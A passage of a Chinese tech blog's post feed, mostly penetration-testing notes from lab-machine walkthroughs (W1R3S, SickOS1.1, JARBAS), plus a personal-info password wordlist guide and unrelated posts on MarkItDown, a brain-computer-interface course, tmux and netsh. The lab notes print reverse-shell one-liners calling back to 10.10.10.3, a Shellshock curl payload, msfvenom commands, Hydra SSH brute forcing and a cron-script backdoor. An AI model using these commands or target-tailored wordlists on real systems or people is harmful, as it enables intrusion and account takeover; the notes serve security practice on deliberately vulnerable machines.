class="code"><pre><code class="hljs txt">a@4<br>b8<br>e3<br>i!1<br>l1<br>o0<br>s$5<br></code></pre></td></tr></table></figure><p>然后执行命令生成 Leet 组合字典：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 生成 Leet 变体 + 个人信息组合</span><br>crunch 4 18 -f leet_charset.txt l33t -t M@ch3l%%,%10191996%,%L0v3%,%4hm3d%,%5w!m% -o michael_leet.txt<br></code></pre></td></tr></table></figure><h4 id="3-混合组合字典（终极版）"><a href="#3-混合组合字典（终极版）" class="headerlink" title="3. 混合组合字典（终极版）"></a>3. 混合组合字典（终极版）</h4><p>结合<strong>姓名缩写 + 生日 + 常见单词</strong>等组合模式，直接编写规则文件 <code>michael_rule.rule</code>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs txt"># 规则格式：[前缀][中缀][后缀]<br>Michael1910<br>mike27<br>AYA1996<br>swimfamily<br>Adam27love<br>M1ch43l1019<br>4hm3d5w!m<br></code></pre></td></tr></table></figure><p>然后用 <code>crunch</code> 读取规则文件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">crunch 5 20 -r michael_rule.rule -o michael_final.txt<br></code></pre></td></tr></table></figure><h1 id="Kali-中使用字典的方法"><a href="#Kali-中使用字典的方法" class="headerlink" title="Kali 中使用字典的方法"></a>Kali 中使用字典的方法</h1><p><strong>Hydra</strong>（远程服务爆破）：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">hydra -l 目标用户名 -P michael_final.txt ssh://目标IP<br></code></pre></td></tr></table></figure><p><strong>Hashcat</strong>（哈希破解）：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">hashcat -m 0 -a 0 目标哈希值 michael_final.txt<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>技术备忘</category>
      
      <category>渗透</category>
      
    </categories>
    
    
    <tags>
      
      <tag>渗透</tag>
      
      <tag>密码爆破</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>MarkItDown 微软开源的文档转换神器</title>
    <link href="/markItDownTools/"/>
    <url>/markItDownTools/</url>
    
    <content type="html"><![CDATA[<h1 id="MarkItDown：微软开源的文档转换神器-全干工程师的文章-知乎"><a href="#MarkItDown：微软开源的文档转换神器-全干工程师的文章-知乎" class="headerlink" title="MarkItDown：微软开源的文档转换神器 - 全干工程师的文章 - 知乎"></a>MarkItDown：微软开源的文档转换神器 - 全干工程师的文章 - 知乎</h1><p><a href="https://zhuanlan.zhihu.com/p/20383472123">https://zhuanlan.zhihu.com/p/20383472123</a></p><p>随着AI越来越深入我们的生活，经常需要处理各种格式的文件，有PDF、Word文档、Excel， 如果可以把这些文件的核心内容以简洁的Markdown语法呈现，投喂给大模型可以让大模型更好的理解我们的私有信息</p><p>MarkItDown是微软开源的一款 Python 工具，可用于将各种文件格式转换为 Markdown 格式。而且还支持集成像GPT-4o这样的多模态LLM，可以直接对图片、音频文件进行更高效的信息处理。</p><h2 id="主要特性"><a href="#主要特性" class="headerlink" title="主要特性"></a><strong>主要特性</strong></h2><ol><li><strong>多格式支持</strong>: 支持多种文件类型的转换，包括:</li></ol><ul><li>办公文档 (PDF, PowerPoint, Word, Excel)</li><li>图像文件 (支持 EXIF 元数据提取和 OCR）</li><li>音频文件 (支持 EXIF 元数据提取和语音转录)</li><li>HTML(支持维基百科等特殊处理)</li><li>文本格式 (CSV, JSON, XML)</li><li>压缩文件 (ZIP，可迭代处理内部文件)</li></ul><ol start="2"><li><strong>便于处理</strong>: 将不同格式的文件内容提取为 Markdown 格式，便于进一步处理、索引或文本分析。</li><li><strong>大模型兼容</strong>: 许多大型语言模型都使用 Markdown 格式，MarkItDown 为这些模型提供了理想的输入格式。<h2 id="安装方法"><a href="#安装方法" class="headerlink" title="安装方法"></a><strong>安装方法</strong></h2><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmd">pip install markitdown<br></code></pre></td></tr></table></figure>或者从源代码安装：<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cmd">git clone https://github.com/microsoft/markitdown<br>pip install -e .<br></code></pre></td></tr></table></figure><h2 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a><strong>使用方法</strong></h2></li></ol><h3 id="1-命令行工具"><a href="#1-命令行工具" class="headerlink" title="1. 命令行工具"></a><strong>1. 命令行工具</strong></h3><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmd">markitdown <span class="hljs-built_in">path</span>-to-file.pdf &gt; document.<span class="hljs-built_in">md</span><br></code></pre></td></tr></table></figure><p>或指定输出文件：</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmd">markitdown <span class="hljs-built_in">path</span>-to-file.pdf -o document.<span class="hljs-built_in">md</span><br></code></pre></td></tr></table></figure><p>通过管道传输内容：</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmd">cat <span class="hljs-built_in">path</span>-to-file.pdf | markitdown<br></code></pre></td></tr></table></figure><h3 id="2-Python-API"><a href="#2-Python-API" class="headerlink" title="2. Python API"></a>2. Python API</h3><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs cmd">from markitdown import MarkItDown<br><span class="hljs-built_in">md</span> = MarkItDown()<br>result = <span class="hljs-built_in">md</span>.<span class="hljs-built_in">convert</span>(&quot;test.xlsx&quot;)<br><span class="hljs-built_in">print</span>(result.text_content)<br></code></pre></td></tr></table></figure><h3 id="3-与大语言模型集成"><a href="#3-与大语言模型集成" class="headerlink" title="3. 与大语言模型集成"></a>3. 与大语言模型集成</h3><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs cmd">from markitdown import MarkItDown<br>from openai import OpenAI<br>client = OpenAI()<br><span class="hljs-built_in">md</span> = MarkItDown(llm_client=client, llm_model=&quot;gpt-<span class="hljs-number">4</span>o&quot;)<br>result = <span class="hljs-built_in">md</span>.<span class="hljs-built_in">convert</span>(&quot;example.jpg&quot;)<br><span class="hljs-built_in">print</span>(result.text_content)<br></code></pre></td></tr></table></figure><h3 id="4-Docker支持"><a href="#4-Docker支持" class="headerlink" title="4. Docker支持"></a>4. Docker支持</h3><p>构建镜像：</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmd">docker build -t markitdown:latest .<br></code></pre></td></tr></table></figure><p>运行镜像：</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmd">docker run --rm -i markitdown:latest &lt; ~/your-file.pdf &gt; output.<span class="hljs-built_in">md</span><br></code></pre></td></tr></table></figure><h2 id="核心技术"><a href="#核心技术" class="headerlink" title="核心技术"></a>核心技术</h2><p>markitdown 核心代码非常少, 大概1500行左右，稍微研究一下就可以发现它本质是一个掉包侠，是根据文件的扩展名自动选择转换工具。<br><img src="https://pic1.imgdb.cn/item/6954ce928801094e3ab4cff0.jpg" alt="markitdown核心"></p><ul><li><strong>外部库集成</strong></li><li>mammoth: DOCX 转 HTML</li><li>markdownify: HTML 转 Markdown</li><li>pandas: 处理 Excel 文件</li><li>pdfminer: 提取 PDF 文本</li><li>BeautifulSoup: 解析 HTML 和 XML</li></ul><h2 id="局限性"><a href="#局限性" class="headerlink" title="局限性"></a><strong>局限性</strong></h2><p>虽说 MarkItDown 已经相当强大，但是人无完人，还是有很多局限性</p><ul><li>复杂 HTML/CSS 布局可能无法完全保留</li><li>图像仅保留为引用，不直接嵌入</li><li>音频/视频仅转换元数据和转录，不包含媒体文件</li></ul>]]></content>
    
    
    <categories>
      
      <category>情报搜索</category>
      
      <category>脑机接口</category>
      
    </categories>
    
    
    <tags>
      
      <tag>备忘</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>脑机接口课程展开方式研究</title>
    <link href="/BCI-lesson/"/>
    <url>/BCI-lesson/</url>
    
    <content type="html"><![CDATA[<p>今天天津高校HAM群里BG9JSW说天津理工大学选课有个《脑机接口创新实训课程》，看到之后上网搜了下过程，想着自己也学习一二，紧跟学科前沿。以下是我找到的一些OSINT介绍，只是对课程的介绍，梳理一个一定程度迭代过的上手流程。<br><a href="https://finance.sina.com.cn/roll/2025-06-12/doc-inezvqpu3446764.shtml">新浪新闻：国内首次 脑机接口实训本科学分课程圆满结课</a><br>介绍了：2025年6月12日，由<a href="https://finance.sina.com.cn/realstock/company/sz002925/nc.shtml">盈趣科技</a>、北洋瑞恒与天津理工大学联合打造的全国首次脑机接口实训本科学分课程圆满结课。本次实训课程于2025年3月29日正式开课，32学时2学分，聚焦脑机接口（BCI）技术基础与应用，涵盖脑电采集、信号处理、脑机交互、人机共融等核心内容，获得广大师生高度评价。<br>图内包含关键词：<a href="https://www.xmuse.cn/">Xmuse</a></p><p><a href="https://m.bilibili.com/video/BV1fwXKYnEGo">果壳 你没看错，开车的是个脑子! 顶刊专访</a><br>天津大学 李晓红<br>天大主编首部《片上脑机接口概论》</p><p>脑机接口导论(已下载)<br>美 Rajesh P. N. Rao 著 张莉 陈民铀 译</p><h1 id="课程内容"><a href="#课程内容" class="headerlink" title="课程内容"></a>课程内容</h1><p>脑机接口入门简介<br>心电数据介绍和测量原理介绍<br>脑电原始数据采集和处理<br>信号处理基本知识的介绍<br>脑电相关实验范式的介绍和实操(睁眼闭眼实验、SSVEP实验、ERP实验)<br>利用AI模型预测大脑状态等</p><p><img src="https://pic1.imgdb.cn/item/6954a22c8801094e3ab22169.png" alt="Xmuse硬件介绍"><br><a href="https://www.xmuse.cn/col.jsp?id=134">https://www.xmuse.cn/col.jsp?id=134</a></p><p><img src="https://pic1.imgdb.cn/item/6954a27d8801094e3ab22173.png" alt="脑机接口专业概述"><br><a href="https://mstu.tju.edu.cn/info/1130/4130.htm">脑机接口专业-天津大学医学院</a></p>]]></content>
    
    
    <categories>
      
      <category>情报搜索</category>
      
      <category>脑机接口</category>
      
    </categories>
    
    
    <tags>
      
      <tag>脑机接口</tag>
      
      <tag>OSINT</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>W1R3S 1.0.1 - nmap_hydra精讲</title>
    <link href="/pen/W1R3S/"/>
    <url>/pen/W1R3S/</url>
    
    <content type="html"><![CDATA[<h1 id="NMAP"><a href="#NMAP" class="headerlink" title="NMAP"></a>NMAP</h1><h2 id="快速主机发现"><a href="#快速主机发现" class="headerlink" title="快速主机发现"></a>快速主机发现</h2><p>nmap -sn 10.10.10.0/24</p><h2 id="TCP扫描"><a href="#TCP扫描" class="headerlink" title="TCP扫描"></a>TCP扫描</h2><p>sudo nmap -sT –min-rate 10000 -p- 10.10.10.21 -oA nmapscan/ports<br>-sT: 完整TCP连接(可以放到下面)<br>-sS: (默认)仅SYN，可能被防火墙拦截<br>–min-rate 10000: 最少同时发包个数<br>-p-： 扫描全部65535个端口<br>-oA： 输出参数到文件</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>-sT解决准+隐蔽性<br>–min-rate隐蔽性和速度的平衡</p><h2 id="nmap输出文件"><a href="#nmap输出文件" class="headerlink" title="nmap输出文件"></a>nmap输出文件</h2><p>*.gnmap; *.nmap; *.xml<br>*.gnmap已被弃用<br>*.nmap与命令行输出一样</p><h2 id="端口提取"><a href="#端口提取" class="headerlink" title="端口提取"></a>端口提取</h2><p>ports=${grep open nmapscan/port.nmap | awk -F’/‘ ‘{print $1}’ | paste -sd ‘,’}</p><h3 id="讲解"><a href="#讲解" class="headerlink" title="讲解"></a>讲解</h3><p>awk -F指定分隔符，并输出第一列<br>paste -s代表输出到单行，-d指定输出分隔符<br>echo $ports 查看变量</p><h2 id="详细扫描"><a href="#详细扫描" class="headerlink" title="详细扫描"></a>详细扫描</h2><p>sudo nmap -sT -sV -sC -O -p[补全] 10.10.10.21 -oA nmapscan/detail<br>-sV: 探测服务版本<br>-sC: 使用默认探测脚本<br>-O: 探测操作系统版本<br>-p: 指定端口,输入$ports按tab会把变量的具体值读取出来</p><h2 id="UDP扫描"><a href="#UDP扫描" class="headerlink" title="UDP扫描"></a>UDP扫描</h2><p>sudo nmap -sU –top-ports 20 10.10.10.21 -oA nmapscan/udp<br>结果中open|filtered代表可能是过滤掉了，存疑的</p><h2 id="默认脚本扫描"><a href="#默认脚本扫描" class="headerlink" title="默认脚本扫描"></a>默认脚本扫描</h2><p>sudo nmap –script=vuln -p[补全] -oA nmapscan/vuln</p><h2 id="总结：nmap的四大扫描及流程"><a href="#总结：nmap的四大扫描及流程" class="headerlink" title="总结：nmap的四大扫描及流程"></a>总结：nmap的四大扫描及流程</h2><ol><li>完整端口扫描</li><li>详细信息扫描</li><li>UDP扫描</li><li>nmap漏洞脚本扫描</li><li>IPv6<br>攻击面分析，确定初步的渗透优先级和策略</li></ol><h1 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h1><h2 id="ftp"><a href="#ftp" class="headerlink" title="ftp"></a>ftp</h2><p>ftp [IP]<br>匿名登录用户名: anonymous or ftp<br>二进制登录: binary<br>帮助: ?<br>关闭交互式提示: prompt<br>下载多个文件： mget *.txt</p><h2 id="可疑hash辨认"><a href="#可疑hash辨认" class="headerlink" title="可疑hash辨认"></a>可疑hash辨认</h2><p>kali: hash-identifier</p><h2 id="md5解码"><a href="#md5解码" class="headerlink" title="md5解码"></a>md5解码</h2><p>vi md5.hash<br>john md5.hash 或搜索 md5 crack</p><h2 id="md5编码"><a href="#md5编码" class="headerlink" title="md5编码"></a>md5编码</h2><p>echo -n ‘’ | md5sum</p><h2 id="base64解码"><a href="#base64解码" class="headerlink" title="base64解码"></a>base64解码</h2><p>echo “” | base64 -d<br>-d: 指定解码</p><h2 id="base64识别"><a href="#base64识别" class="headerlink" title="base64识别"></a>base64识别</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs txt">@雪舞QAN<br>红笔师傅提到的辨别，雀食是一个问题，分享一下我自己的识别方法。<br>base64除了数字和大小写字母，剩下的特殊符号只有3个。<br>第一是看特殊字符，或者说是正则规则匹配<br>+ / = 0-9 a-z A-Z<br>确认没有其他特殊字符就可以尝试base64的解码<br>第二就是 = 只在文末出现，最多2个。原因是补足<br>第三就是一些特殊情况。稍微复杂一点，主要是针对短字符串，首先base64的字符串一定能被4整数。比如root可以被4整除，但它其实并不是base64编码，因为解码之后的ascii码不在32-126之间，会有乱码。所以这里的主要判断方法还是解码看有没有乱码。这里还有一个特例，就是长度为1的非base64的字符串解码是空。<br></code></pre></td></tr></table></figure><h3 id="小工具"><a href="#小工具" class="headerlink" title="小工具"></a>小工具</h3><p>rev: 字符串前后顺序的调整</p><h2 id="mysql"><a href="#mysql" class="headerlink" title="mysql"></a>mysql</h2><p>mysql -h 10.10.10.21 -u root -p </p><h2 id="80端口"><a href="#80端口" class="headerlink" title="80端口"></a>80端口</h2><p>目录爆破可使用gobuster<br>wordlist: /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt</p><h2 id="寻找公开漏洞"><a href="#寻找公开漏洞" class="headerlink" title="寻找公开漏洞"></a>寻找公开漏洞</h2><p>searchsploit: 搜索exploit-db(kali公司产品)数据库的本地拷贝<br>searchsploit [keyword] -m 25971<br>下载</p><h2 id="传递参数"><a href="#传递参数" class="headerlink" title="传递参数"></a>传递参数</h2><p>使用BurpSuite或命令行curl<br>curl –data-urlencode ‘’ [url]<br>通过POST方式传递</p><h2 id="passwd解析"><a href="#passwd解析" class="headerlink" title="passwd解析"></a>passwd解析</h2><p>每一条用户数据的第二段都是x，证明密码是以哈希的方式存在shadow文件中<br>john shadow</p><h2 id="ssh登陆后"><a href="#ssh登陆后" class="headerlink" title="ssh登陆后"></a>ssh登陆后</h2><p>whoami: 当前账户<br>id: 查看是否有sudo<br>uname -a: 查看操作系统情况<br>sudo -l: 查看当前用户有哪些系统级权限</p><h1 id="Bonus"><a href="#Bonus" class="headerlink" title="Bonus"></a>Bonus</h1><h2 id="爆破SSH"><a href="#爆破SSH" class="headerlink" title="爆破SSH"></a>爆破SSH</h2><h3 id="构造用户信息"><a href="#构造用户信息" class="headerlink" title="构造用户信息"></a>构造用户信息</h3><p>vim user.list<br>hydra -L user.list -P /usr/share/wordlists/rockyou.txt ssh://10.10.10.21 -t 4<br>-L: 用户名列表<br>-P: 密码表，示例适用于HTB、Vulhub<br>-t: 线程数</p><p>总结自B站原视频：<a href="https://www.bilibili.com/video/BV1mB4y1j7K6">「红队笔记」靶机精讲：W1R3S 1.0.1</a></p>]]></content>
    
    
    <categories>
      
      <category>技术备忘</category>
      
      <category>渗透</category>
      
    </categories>
    
    
    <tags>
      
      <tag>渗透</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>tmux快捷键</title>
    <link href="/tmuxflookup/"/>
    <url>/tmuxflookup/</url>
    
    <content type="html"><![CDATA[<p>前缀键（默认是 Ctrl + b）<br>割成左右 &gt; 前缀键 + %<br>割成上下 &gt; 前缀键 + “<br>切换焦点 &gt; 前缀键 + 方向键（上/下/左/右）  或者  前缀键 + o<br>调整窗格大小 &gt; 按住 前缀键，然后按方向键<br>关闭当前窗格 &gt; 前缀键 + x<br>全屏/取消全屏 &gt; 前缀键 + z</p>]]></content>
    
    
    <categories>
      
      <category>技术备忘</category>
      
      <category>Linux</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Linux</tag>
      
      <tag>备忘</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SickOS1.1 - 穿越Squid代理的CMS渗透</title>
    <link href="/pen/SickOS1.1_2way/"/>
    <url>/pen/SickOS1.1_2way/</url>
    
    <content type="html"><![CDATA[<h1 id="「红队笔记」靶机精讲：SickOS1-1-穿越Squid代理的CMS渗透"><a href="#「红队笔记」靶机精讲：SickOS1-1-穿越Squid代理的CMS渗透" class="headerlink" title="「红队笔记」靶机精讲：SickOS1.1 - 穿越Squid代理的CMS渗透"></a>「红队笔记」靶机精讲：SickOS1.1 - 穿越Squid代理的CMS渗透</h1><h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><p>参见<a href="/pen/W1R3S#NMAP">端口扫描 &gt; NMAP</a></p><ol><li>主机发现</li><li>快速扫描开放端口</li><li>扫描端口版本、系统版本</li><li>UDP扫描、脚本扫描<br>3128 squid-http</li></ol><h1 id="方法1"><a href="#方法1" class="headerlink" title="方法1"></a>方法1</h1><h2 id="下一步思路"><a href="#下一步思路" class="headerlink" title="下一步思路"></a>下一步思路</h2><p>一是了解squid怎么用<br>二是对3128进行目录爆破<br>sudo dirb <a href="http://10.10.10.19:3128/">http://10.10.10.19:3128/</a><br>sudo gobuster dir -u [url] -w usr/share/seclists/Discovery/web-Content/raft-large-directories.txt (-x html,php)指定扩展名<br>这里使用的字典要安装feroxbuster<br>dirsearch</p><h2 id="代理"><a href="#代理" class="headerlink" title="代理"></a>代理</h2><p>发现应用代理、WAF可能阻挡了扫描。现在试下用3128作代理会发生什么<br>sudo dirb <a href="http://10.10.10.19/">http://10.10.10.19</a> -p <a href="http://10.10.10.19:3128/">http://10.10.10.19:3128</a><br>（其实背后不一定是80端口）<br>配置浏览器代理为3128之后访问被扫描到的url</p><h2 id="敏感信息"><a href="#敏感信息" class="headerlink" title="敏感信息"></a>敏感信息</h2><p>robot文件发现wolfcms关键词，搜索wolfcms admin path<br>尝试弱密码登录，搜索wolfcms default admin password</p><h2 id="php木马"><a href="#php木马" class="headerlink" title="php木马"></a>php木马</h2><p>搜索php reverse shell one-liner<br>端口选择可能通过防火墙的<br>‘’’php<br><?php exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.10.3/443 0>&1'");?><br>‘’’<br>sudo nc -lvnp 443建立监听</p><h2 id="预渗透？"><a href="#预渗透？" class="headerlink" title="预渗透？"></a>预渗透？</h2><p>提取/etc/passwd中的用户名到users.txt<br>cat /etc/passwd | awk -F’:’ ‘{print $1}’ &gt; users.txt<br>以上代码覆盖输出users.txt<br>用hydra测试哪个用户的密码是john@123<br>hydra -L users.txt -p ‘john@123’ ssh://目标IP<br>弹幕：多账户的ssh登录尝试使用crackmapexec</p><h1 id="方法2"><a href="#方法2" class="headerlink" title="方法2"></a>方法2</h1><h2 id="nikto扫描"><a href="#nikto扫描" class="headerlink" title="nikto扫描"></a>nikto扫描</h2><p><code>sudo nikto -h 10.10.10.19 -useproxy http://10.10.10.19:3128</code><br>发现shellshock漏洞（别名shelldoor），在bash4.1前很有用<br>目录为/cgi-bin/status<br>测试shellshock漏洞<br><code>sudo curl -v --proxy http://10.10.10.19:3128 http://10.10.10.19/cgi-bin/status -H &quot;Referer:() &#123;  test;&#125;; echo &#39;Content-Type: text/plain&#39;; echo; echo; /usr/bin/id; exit&quot;</code><br>-v: 显示更多信息</p><h2 id="msfvenom构造bash反射式shell"><a href="#msfvenom构造bash反射式shell" class="headerlink" title="msfvenom构造bash反射式shell"></a>msfvenom构造bash反射式shell</h2><p>构造payload:<br><code>sudo msfvenom -p cmd/nuix/reverse_bash lhost=10.10.10.3 lport=443 -f raw</code></p><ul><li>cmd/unix目录下</li><li>lhost：目标ip</li><li>lport：目标端口</li><li>reverse_bash，反向bash连接<br><code>0&lt;&amp;144-;exec 144&lt;&gt;/dev/tcp/10.10.10.3/443;sh &lt;&amp;144 &gt;&amp;144 2&gt;&amp;144</code><br>有时payload用的sh会报错，因为没配置路径，先试试，根据结果再考虑改为/bin/sh<br>开启监听<br><code>sudo nc -lvnp 443</code><br>利用shellshock漏洞，将上面生成的payload放在这里<br><code>sudo curl -v --proxy http://10.10.10.19:3128 http://10.10.10.19/cgi-bin/status -H &quot;Referer:() &#123;  test;&#125;; &quot;0&lt;&amp;144-;exec 144&lt;&gt;/dev/tcp/10.10.10.3/443;/bin/sh &lt;&amp;144 &gt;&amp;144 2&gt;&amp;144</code><br>获得shell后了解主机信息<br>whoami<br>uname -a<br>dpkg -l<br>有安装python的话，通过以下命令获得交互性更好的shell<br><code>python -c &quot;import pty;pty.spawn(&#39;/bin/bash&#39;)&quot;</code><br><code>sudo -l</code>但不知道密码<h2 id="提权信息收集"><a href="#提权信息收集" class="headerlink" title="提权信息收集"></a>提权信息收集</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">ls<br><span class="hljs-built_in">cd</span> /var<br>ls -liah<br><span class="hljs-built_in">cd</span> /etc<br>ls -liah cron* <span class="hljs-comment"># 居然可以用通配符</span><br></code></pre></td></tr></table></figure><h2 id="msfvenom构造python反射式shell"><a href="#msfvenom构造python反射式shell" class="headerlink" title="msfvenom构造python反射式shell"></a>msfvenom构造python反射式shell</h2><code>sudo msfvenom -p cmd/nuix/reverse_python lhost=10.10.10.3 lport=444 -f raw</code><br>开启监听！<br>vi盲操作<br>按o新起一行，粘贴，esc，冒号wq</li></ul><h1 id="反思"><a href="#反思" class="headerlink" title="反思"></a>反思</h1><p>被root定时执行的脚本一定不能让普通用户组修改</p>]]></content>
    
    
    <categories>
      
      <category>技术备忘</category>
      
      <category>渗透</category>
      
    </categories>
    
    
    <tags>
      
      <tag>渗透</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>JARBAS - Jenkins渗透原理详解</title>
    <link href="/pen/JARBAS/"/>
    <url>/pen/JARBAS/</url>
    
    <content type="html"><![CDATA[<h1 id="「红队笔记」靶机精讲：JARBAS-Jenkins渗透原理详解，一个典型CMS渗透测试样本"><a href="#「红队笔记」靶机精讲：JARBAS-Jenkins渗透原理详解，一个典型CMS渗透测试样本" class="headerlink" title="「红队笔记」靶机精讲：JARBAS - Jenkins渗透原理详解，一个典型CMS渗透测试样本"></a>「红队笔记」靶机精讲：JARBAS - Jenkins渗透原理详解，一个典型CMS渗透测试样本</h1><h2 id="基础思路"><a href="#基础思路" class="headerlink" title="基础思路"></a>基础思路</h2><p>逐步扫描端口（上一集有讲）<br>发现8080登录端口</p><ul><li>密码爆破</li><li>查找默认密码</li><li>猜弱密码</li><li>80端口浏览、目录爆破（信息泄露）<h2 id="目录爆破"><a href="#目录爆破" class="headerlink" title="目录爆破"></a>目录爆破</h2><code>sudo dirb http://10.10.10.21</code><br><code>sudo gobuster dir -u [url] -w [dict] (-x html,php)</code>指定扩展名<br><code>dirsearch</code><br>弹幕: 这里使用的字典要安装feroxbuster<h2 id="MD5Reverse"><a href="#MD5Reverse" class="headerlink" title="MD5Reverse"></a>MD5Reverse</h2>hash-identfier 工具识别（密码喷射<sup id="fnref:1" class="footnote-ref"><a href="#fn:1" rel="footnote"><span class="hint--top hint--rounded" aria-label="https://red.y1ng.org/0x8_凭证获取/T1110-003-win-密码喷射/">[1]</span></a></sup>）<br>常用网站</li><li>hashes.com</li><li>crackstation.net<h2 id="ExecuteShell"><a href="#ExecuteShell" class="headerlink" title="ExecuteShell"></a>ExecuteShell</h2>登录后遇见Build Environment, 可以执行反弹Shell<br><code>/bin/bash -i &gt;&amp; /dev/tcp/10.10.10.3/4444 0&gt;&amp;1</code><br>在kali开启监听<br><code>sudo nc -lvnp 4444</code><br>Jenkins里点击Build Now。尝试获得反弹Shell</li></ul><h2 id="查看获得的Shell状态"><a href="#查看获得的Shell状态" class="headerlink" title="查看获得的Shell状态"></a>查看获得的Shell状态</h2><p><code>whoami</code><br><code>uname -a</code>    查看系统<br><code>ip a</code>或<code>ifconfig</code>查看发现无效<br>dpkg -l 无效<br>思路：提权在初步的枚举上遇见较大障碍，只能看系统有哪些权限<br>sudo -l 查看当前用户有哪些权限<br>cat /etc/passwd 查看当前系统有哪些用户<br>ps. 最后一个引号后有/bin/bash代表用户被分配了bash<br>弹幕：查到jenkins是一个ci系统以后就应该想到这里会有自定义构建命令的空子可以利用<br>弹幕：不止是pyhton，根据靶机实际情况可以创造不同的反弹shell，可以去详细了解一下，也有相关的反弹shell生成网站</p><h2 id="其他提权尝试"><a href="#其他提权尝试" class="headerlink" title="其他提权尝试"></a>其他提权尝试</h2><ul><li>查看定时任务<br>cat /etc/crontab<br>cat /etc/cron.d<br>该靶机发现root /etc/script/CleaningScript.sh &gt;/dev/null 2&gt;&amp;1<br>cat /etc/script/CleaningScript.sh<br>echo “/bin/bash -i &gt;&amp; /dev/tcp/10.10.10.3/4443 0&gt;&amp;1” &gt;&gt; /etc/script/CleaningScript.sh<br>追加到脚本里，使用其他端口，提前执行以下命令开启监听<br>sudo nc -lvnp 4443<br>ps. 对于clear没反应的终端，可以输入 export TERM=xterm，就可以clear了</li></ul><section class="footnotes"><div class="footnote-list"><ol><li><span id="fn:1" class="footnote-text"><span><a href="https://red.y1ng.org/0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1110-003-win-%E5%AF%86%E7%A0%81%E5%96%B7%E5%B0%84/">https://red.y1ng.org/0x8_凭证获取/T1110-003-win-密码喷射/</a><a href="#fnref:1" rev="footnote" class="footnote-backref"> ↩</a></span></span></li></ol></div></section>]]></content>
    
    
    <categories>
      
      <category>技术备忘</category>
      
      <category>渗透</category>
      
    </categories>
    
    
    <tags>
      
      <tag>渗透</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Windows快速切换IP、DNS</title>
    <link href="/quicklySwapIP_win/"/>
    <url>/quicklySwapIP_win/</url>
    
    <content type="html"><![CDATA[<p>要想切换 IPV4 的IP和DNS要进到控制面板点四五下、逐步确认并退出要点3下，要是在外调试这样重复无数遍简直是浪费生命，快利用netsh挽救生命</p><p>搜索栏搜索cmd，以管理员运行</p><blockquote><p>netsh interface show interface</p></blockquote><p>设置固定IP</p><blockquote><p>netsh interface ipv4 set address name=”以太网 2” static 10.18.7.230 255.255.255.0 10.18.7.254</p></blockquote><p>设置固定IP (但不设置网关)</p><blockquote><p>netsh interface ipv4 set address name=”以太网 2” static 192.168.0.230 255.255.255.0 0.0.0.0</p></blockquote><p>设置固定DNS</p><blockquote><p>netsh interface ipv4 set dns name=”以太网 2” static 10.80.63.1 primary</p></blockquote><p>设置地址自动获取</p><blockquote><p>netsh interface ipv4 set address name=”以太网 2” dhcp</p></blockquote><p>设置DNS自动获取</p><blockquote><p>netsh interface ipv4 set dns name=”以太网 2” dhcp</p></blockquote><p>禁用网卡、启用网卡（没试过）</p><blockquote><p>netsh interface set interface “以太网 2” admin=disable<br>netsh interface set interface “以太网 2” admin=enable</p></blockquote>]]></content>
    
    
    <categories>
      
